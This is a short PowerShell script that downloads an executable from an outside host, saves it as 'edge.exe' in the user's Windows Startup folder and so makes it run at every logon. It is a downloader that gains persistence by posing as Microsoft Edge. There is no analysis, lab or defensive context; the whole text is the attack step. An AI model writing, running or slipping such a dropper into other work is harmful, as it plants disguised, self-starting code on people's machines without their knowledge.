$startupFolder = [Environment]::GetFolderPath("Startup")
$url = "https://csabi.zip/edge.exe"
$outputPath = Join-Path $startupFolder "edge.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath